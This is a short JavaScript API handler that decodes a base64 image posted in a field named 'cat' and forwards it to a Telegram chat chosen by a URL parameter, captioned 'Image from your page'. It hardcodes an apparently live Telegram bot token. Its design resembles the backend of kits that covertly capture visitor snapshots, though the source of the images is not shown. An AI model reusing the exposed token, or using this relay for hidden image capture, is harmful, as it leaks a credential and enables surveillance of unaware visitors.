import { Buffer } from "buffer";
import FormData from "form-data";
import fetch from "node-fetch";

export const config = {
  api: {
    bodyParser: {
      sizeLimit: "5mb", // biar muat gambar
    },
  },
};

const BOT_TOKEN = "7525794586:AAH9YlfXazDX1zzx1ss23q8RuIqyMJcVzZI";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).send("Method not allowed");

  const { cat } = req.body;
  const uid = req.query.uid;

  if (!cat || !uid) return res.status(400).send("Missing data");

  try {
    // Hapus prefix base64
    const base64Data = cat.replace(/^data:image\/\w+;base64,/, "");
    const buffer = Buffer.from(base64Data, "base64");

    const form = new FormData();
    form.append("chat_id", uid);
    form.append("caption", "📸 Gambar dari halaman kamu");
    form.append("photo", buffer, {
      filename: "image.png",
      contentType: "image/png",
    });

    const telegramRes = await fetch(`${TELEGRAM_API}/sendPhoto`, {
      method: "POST",
      body: form,
      headers: form.getHeaders(),
    });

    const result = await telegramRes.json();

    if (!result.ok) {
      console.error("Telegram error:", result);
      return res.status(500).json({ error: result.description });
    }

    res.status(200).json({ ok: true });
  } catch (err) {
    console.error("Catch Error:", err);
    res.status(500).send("Telegram error");
  }
}
